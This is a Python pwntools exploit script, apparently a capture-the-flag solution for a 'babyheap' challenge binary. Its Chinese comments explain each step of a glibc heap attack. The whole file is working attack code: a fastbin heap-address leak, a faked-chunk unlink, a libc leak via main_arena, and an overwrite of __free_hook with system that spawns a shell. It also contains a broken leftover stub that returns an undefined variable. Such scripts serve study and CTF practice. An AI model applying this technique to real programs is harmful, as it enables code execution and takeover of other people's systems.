# -*- coding:utf-8 -*-
from pwn import *

#context.log_level = 'debug'
p = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#free_got = elf.symbols['free']

def alloc(index, content):
        p.recvuntil('Choice:')
        p.sendline('1')
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Content:')
        p.sendline(content)

def edit(index, content):
        p.recvuntil('Choice:')
        p.sendline('2')
        p.recvuntil('Index:')
        p.sendline(str(index))
        p.recvuntil('Content:')
        p.sendline(content)

def show(index):
        p.recvuntil('Choice:')
        p.sendline('3')
        p.recvuntil('Index:')
        p.sendline(str(index))

def free(index):
        p.recvuntil('Choice:')
        p.sendline('4')
        p.recvuntil('Index:')
        p.sendline(str(index))

def leak_heap():
        return res


alloc(0, '0')
alloc(1, '1')
alloc(2, '2')
#可以通过fastbin中chunk的fd泄露堆地址
free(1)
free(0)
show(0)
heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x30
print "heap_addr : %#x " % heap_addr

#构造unlink
#注意unlink中第一个chunk的大小无限制，第二个chunk就需要smallchunk了
#同时注意smallchunk后面的chunk的inuse位需要为1，且不能是topchunk
#第一个chunk的size位貌似可以为0，还不清楚原因
chunk_ptr = 0x602060 
alloc(3, p64(0) + p32(0x31))	#伪造size，准备在这分配chunk
alloc(4, '4')
free(4)
edit(4, p64(heap_addr + 0x10))	#在fd中写入分配地址
alloc(5, '5')
alloc(6, p64(chunk_ptr - 0x18) + p64(chunk_ptr - 0x10) + p64(0x20) + p32(0x90))	#分配，并准备unlink
free(0)	
alloc(7, p64(0) + p32(0))	#设置第一个chunk的presize、size(size可以为0，迷)
alloc(8, '8')
alloc(9, '/bin/sh\x00')	#之后getshell时用
#unlink！
free(5)
#unlink后，的fd和bk又可以用来泄露libc
show(6)
#fd、bk的值是&main_arena+0x55，通过ida打开libc查找malloc_trim，dowhile循环上一条语句就是main_arena地址
libc_base = (u64(p.recvline()[:6].ljust(8, '\x00')) - 0x3c27b8)
system = libc_base + libc.symbols['system'] 
free_hook = libc.symbols['__free_hook'] + libc_base
print "libc_base : %#x" % libc_base
print "free_hook : %#x" % free_hook
print "system : %#x" % system

gdb.attach(p)
#当不能写got表时 考虑malloc_hook、free_hook
payload = p64(0)*3 + p64(free_hook)
edit(0, payload[:-1])
edit(0, p64(system))
free(9)

p.interactive()
